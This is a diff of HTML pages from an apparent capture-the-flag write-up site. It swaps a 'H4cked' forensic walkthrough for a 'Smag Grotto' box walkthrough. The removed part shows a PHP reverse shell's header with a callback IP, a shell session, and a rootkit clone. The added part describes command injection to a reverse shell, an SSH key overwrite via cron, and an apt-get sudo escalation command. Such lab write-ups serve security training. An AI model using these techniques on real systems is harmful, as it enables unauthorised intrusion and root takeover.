+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_extra</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_sc</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessBAK</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_orig</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessOLD</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessOLD2</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htm</span><span class="w">                                            </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.html</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htpasswds</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htpasswd_test</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.httr</span><span class="o">-</span><span class="n">oauth</span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">53</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.php</span><span class="w">                                            </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">53</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.php3</span><span class="w">                                           </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">24</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">402</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">index.php</span><span class="w">                                        </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">24</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">402</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">index.php</span><span class="o">/</span><span class="n">login</span><span class="o">/</span><span class="w">                                 </span>
+<span class="hll"><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">27</span><span class="p">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">307</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">mail</span><span class="w">  </span><span class="o">-&gt;</span><span class="w">  </span><span class="n">http</span><span class="o">://</span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="w">                </span>
+</span><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">27</span><span class="p">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="o">-</span><span class="w">    </span><span class="m">2</span><span class="n">KB</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="w">                                            </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">37</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="w">                                    </span>
+<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">09</span><span class="o">:</span><span class="m">37</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="o">/</span>
 </code></pre></div></td></tr></table></div>
-<ul class="task-list">
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL? <strong><code>http://pentestmonkey.net/tools/php-reverse-shell</code></strong></li>
-</ul>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="x">  </span><span class="cp">&lt;?php</span>
-  <span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
-  <span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
-  <span class="c1">//</span>
-  <span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
-  <span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
-  <span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
-  <span class="c1">// do not use this tool.</span>
-  <span class="o">.</span>
-  <span class="o">.</span>
-  <span class="o">.</span>
-  <span class="c1">// Usage</span>
-  <span class="c1">// -----</span>
-<span class="hll">  <span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
-</span>
-  <span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-  <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&quot;1.0&quot;</span><span class="p">;</span>
-  <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.147&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
-  <span class="nv">$port</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
-  <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
-  <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-</code></pre></div></td></tr></table></div>
-<ul class="task-list">
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command did the attacker manually execute after getting a reverse shell? <strong><code>whoami</code></strong></p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span>
-<span class="normal">5</span>
-<span class="normal">6</span>
-<span class="normal">7</span>
-<span class="normal">8</span>
-<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">Linux</span><span class="w"> </span><span class="n">wir3</span><span class="w"> </span><span class="m">4.15</span><span class="n">.</span><span class="m">0-135</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="c1">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
-<span class="m">22</span><span class="o">:</span><span class="m">26</span><span class="o">:</span><span class="m">54</span><span class="w"> </span><span class="n">up</span><span class="w">  </span><span class="m">2</span><span class="o">:</span><span class="m">21</span><span class="p">,</span><span class="w">  </span><span class="m">1</span><span class="w"> </span><span class="n">user</span><span class="p">,</span><span class="w">  </span><span class="n">load</span><span class="w"> </span><span class="n">average</span><span class="o">:</span><span class="w"> </span><span class="m">0.02</span><span class="p">,</span><span class="w"> </span><span class="m">0.07</span><span class="p">,</span><span class="w"> </span><span class="m">0.08</span>
-<span class="n">USER</span><span class="w">     </span><span class="n">TTY</span><span class="w">      </span><span class="n">FROM</span><span class="w">             </span><span class="n">LOGIN</span><span class="o">@</span><span class="w">   </span><span class="n">IDLE</span><span class="w">   </span><span class="n">JCPU</span><span class="w">   </span><span class="n">PCPU</span><span class="w"> </span><span class="n">WHAT</span>
-<span class="n">jenny</span><span class="w">    </span><span class="n">tty1</span><span class="w">     </span><span class="o">-</span><span class="w">                </span><span class="m">20</span><span class="o">:</span><span class="m">06</span><span class="w">   </span><span class="m">37.00</span><span class="n">s</span><span class="w">  </span><span class="m">1.00</span><span class="n">s</span><span class="w">  </span><span class="m">0.14</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">bash</span>
-<span class="n">uid</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
-<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span><span class="w"> </span><span class="m">0</span><span class="o">:</span><span class="w"> </span><span class="n">can</span><span class="s">&#39;</span><span class="err">t access tty; job control turned off</span>
-<span class="hll"><span class="o">$</span><span class="w"> </span><span class="n">whoami</span>
-</span><span class="n">www</span><span class="o">-</span><span class="n">data</span>
-<span class="o">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
-</code></pre></div></td></tr></table></div>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> What is the computer's hostname? <strong><code>wir3</code></strong></p>
-</li>
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command did the attacker execute to spawn a new TTY shell? 
-    <strong><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></strong></li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Which command was executed to gain a root shell? <strong><code>sudo su</code></strong></p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="hll"><span class="o">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
-</span><span class="hll"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">jenny</span>
-</span><span class="n">su</span><span class="w"> </span><span class="n">jenny</span>
-<span class="n">Password</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
-
-<span class="n">jenny</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
-<span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
-<span class="p">[</span><span class="n">sudo</span><span class="p">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">jenny</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span>
-
-<span class="n">Matching</span><span class="w"> </span><span class="n">Defaults</span><span class="w"> </span><span class="n">entries</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">jenny</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">wir3</span><span class="o">:</span>
-<span class="w">    </span><span class="n">env_reset</span><span class="p">,</span><span class="w"> </span><span class="n">mail_badpass</span><span class="p">,</span>
-<span class="w">    </span><span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">sbin</span>\<span class="o">:/</span><span class="n">bin</span>\<span class="o">:/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
-
-<span class="n">User</span><span class="w"> </span><span class="n">jenny</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">commands</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">wir3</span><span class="o">:</span>
-<span class="w">    </span><span class="p">(</span><span class="n">ALL</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">ALL</span><span class="p">)</span><span class="w"> </span><span class="n">ALL</span>
-<span class="hll"><span class="n">jenny</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">su</span>
-</span><span class="n">sudo</span><span class="w"> </span><span class="n">su</span>
-<span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/</span><span class="c1"># whoami</span>
-<span class="n">whoami</span>
-<span class="n">root</span>
-<span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:/</span><span class="c1"># cd</span>
-</code></pre></div></td></tr></table></div>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The attacker downloaded something from GitHub. What is the name of the GitHub project? <strong><code>Reptile</code></strong></p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
-<span class="normal">2</span>
-<span class="normal">3</span>
-<span class="normal">4</span>
-<span class="normal">5</span>
-<span class="normal">6</span>
-<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">cd</span>
-<span class="hll"><span class="n">root</span><span class="o">@</span><span class="n">wir3</span><span class="o">:~</span><span class="c1"># git clone https://github.com/f0rb1dd3n/Reptile.git</span>
-</span><span class="hll"><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">github.com</span><span class="o">/</span><span class="n">f0rb1dd3n</span><span class="o">/</span><span class="n">Reptile.git</span>
-</span><span class="n">Cloning</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="s">&#39;Reptile&#39;</span><span class="kc">...</span>
-<span class="n">remote</span><span class="o">:</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">objects</span><span class="o">:</span><span class="w"> </span><span class="m">217</span><span class="p">,</span><span class="w"> </span><span class="n">done..</span><span class="p">[</span><span class="n">K</span>
-<span class="n">remote</span><span class="o">:</span><span class="w"> </span><span class="n">Counting</span><span class="w"> </span><span class="n">objects</span><span class="o">:</span><span class="w">   </span><span class="m">0</span><span class="o">% (1/217).[K</span>
-<span class="o">remote: Counting objects:   1%</span><span class="w"> </span><span class="p">(</span><span class="m">3</span><span class="o">/</span><span class="m">217</span><span class="p">)</span><span class="n">.</span><span class="p">[</span><span class="n">K</span>
-</code></pre></div></td></tr></table></div>
-</li>
-<li class="task-list-item">
-<p><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called <strong><code>Rootkit</code></strong></p>
-</li>
-</ul>
-<h2 id="task-2"><b>Task 2</b><a class="headerlink" href="#task-2" title="Permanent link">&para;</a></h2>
-<p>While using the Hydra tool to perform a brute force attack on the FTP service, I was able to discover that the password for Jenny.</p>
+<p>Upon visiting the site, I received a pcap file and some development progress information. </p>
 <p><img id="image1" /></p>
-<p>I uploaded my reverse shell replacing the one in webserver and accessed through browser. I concurrently launched a listener to intercept the incoming shell.</p>
 <p><img id="image2" /></p>
-<p>By utilizing the credentials discovered in Task-1, I logged in as <code>Jenny</code> using <strong><code>su jenny</code></strong>. As Jenny possessed access to all commands in Linux, I executed <strong><code>sudo su</code></strong> to escalate my privileges to root.</p>
+<p>While analyzing the pcap file, I discovered the domain for the development site and obtained a username and password for login.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code>strings<span class="w"> </span>Captured.pcap<span class="w">          </span>
+&lt;eU@
+4eV@
+POST<span class="w"> </span>/login.php<span class="w"> </span>HTTP/1.1
+<span class="hll">Host:<span class="w"> </span>development.smag.thm
+</span>User-Agent:<span class="w"> </span>curl/7.47.0
+Accept:<span class="w"> </span>*/*
+Content-Length:<span class="w"> </span><span class="m">39</span>
+Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
+<span class="hll"><span class="nv">username</span><span class="o">=</span>helpdesk<span class="p">&amp;</span><span class="nv">password</span><span class="o">=[</span>REDACTED<span class="o">]</span>
+</span>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Wed,<span class="w"> </span><span class="m">03</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">2020</span><span class="w"> </span><span class="m">18</span>:04:07<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Length:<span class="w"> </span><span class="m">0</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+4eX@
+4eY@
+4eZ@
+</code></pre></div></td></tr></table></div>
+<p>Subsequently, when accessing the dev site, I was able to locate a login website where I utilized the credentials obtained in the previous step. </p>
 <p><img id="image3" /></p>
-<p>I accessed the flag.txt file located in the Reptile directory and read its contents.</p>
+<h2 id="initial-access"><b>Initial Access</b><a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h2>
+<p>It redirected to another page and provided me a text field to run any commands hopefully linux ones. However, despite trying various commands, I was unable to display any data. Realizing that it was a blind shot, I hosted a reverse shell from my side and attempted to access it using the wget command. Unfortunately, this approach also did not work. Later, I leveraged the reverse shell netcat command to connect back to the system, which allowed me to gain initial access. </p>
 <p><img id="image4" /></p>
+<p>The user account associated with this access was www-data. </p>
+<p><img id="image5" /></p>
+<h2 id="privilege-escalation"><b>Privilege Escalation</b><a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="gaining-user-access-jake"><b>Gaining user access (Jake)</b><a class="headerlink" href="#gaining-user-access-jake" title="Permanent link">&para;</a></h3>
+<p>While enumerating the system, I discovered a CRON job that ran every minute with the command:</p>
+<p><code>/bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys</code></p>
+<p><img id="image6" /></p>
+<p>I found a public ssh key present in the <strong>authorized_keys</strong> file, and as I had write permissions, I was eager to impersonate it. To do so, I created a SSH key pair with public and private keys, and overwrote my public key to <strong><code>/opt/.backups/jake_id_rsa.pub.backup</code></strong>, which saved to <strong><code>/home/jake/.ssh/authorized_keys</code></strong>.</p>
+<p><img id="image7" /></p>
+<div class="admonition abstract">
+<p class="admonition-title">Note</p>
+<p><span><strong>authorized_keys</strong> contains a list of public keys that are authorized to access a user's account on a remote system, and it does not explicitly require passwords, but instead requires the private key of the public key present in that file.</span></p>
+</div>
+<p>Since I possessed my private key, I logged in as Jake using the following command and found the user flag.</p>
+<div class="highlight"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">~/</span><span class="n">.ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="w"> </span><span class="n">jake</span><span class="o">@</span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span>
+</code></pre></div>
+<p><img id="image8" /></p>
+<div class="admonition abstract">
+<p class="admonition-title">Note</p>
+<p><span>To pass a private key when connecting to a remote system, the file must have <strong>600</strong> permission to carry out the action, ensuring that only the user has access to read and write, and no one else.</span></p>
+</div>
+<h3 id="gaining-root-access"><b>Gaining root access</b><a class="headerlink" href="#gaining-root-access" title="Permanent link">&para;</a></h3>
+<p>Once I had gained access to Jake's account, I made it to escalate privileges to root. My first step was to search for any sudo powers that Jake possessed. </p>
+<p><img id="image9" /></p>
+<p>I quickly searched the database of <a href="https://gtfobins.github.io/gtfobins/apt-get/#sudo">gtfobins</a> where you can find different commands to bypass local security restrictions.
+Using the following command, I successufully grabbed the root flag.</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span>-o<span class="w"> </span>APT::Update::Pre-Invoke::<span class="o">=</span>/bin/sh
+</code></pre></div>
+<p><img id="image10" /></p>
 <script>
 
 // JSON object
 const data = {
-    "desc": "Find out what happened by analysing a .pcap file and hack your way back into the machine",
-    "ip":  "10.10.199.134",
-    "ports": "21/tcp,ftp,vsftpd 2.0.8 or later;80/tcp,http,Apache httpd 2.4.29 ((Ubuntu))",
+    "desc": "Follow the yellow brick road. Deploy the machine and get root privileges.",
+    "ip":  "10.10.80.3",
+    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.8;80/tcp,http,Apache httpd 2.4.18",
     "difficulty":"easy",
-    "id": "9"
+    "id": "10"
 }
 
 
@@ -1143,6 +1081,7 @@ function updateHTML() {
         }
     }
 
+
 }
 
 updateHTML();
@@ -1170,7 +1109,7 @@ updateHTML();
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../poster/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Poster" rel="prev">
+          <a href="../h4cked/" class="md-footer__link md-footer__link--prev" aria-label="Previous: H4cked" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -1179,26 +1118,11 @@ updateHTML();
                 <span class="md-footer__direction">
                   Previous
                 </span>
-                Poster
+                H4cked
               </div>
             </div>
           </a>
         
-        
-          
-          <a href="../SmagGrotto/" class="md-footer__link md-footer__link--next" aria-label="Next: Smag Grotto" rel="next">
-            <div class="md-footer__title">
-              <div class="md-ellipsis">
-                <span class="md-footer__direction">
-                  Next
-                </span>
-                Smag Grotto
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
-            </div>
-          </a>
         
       </nav>
     
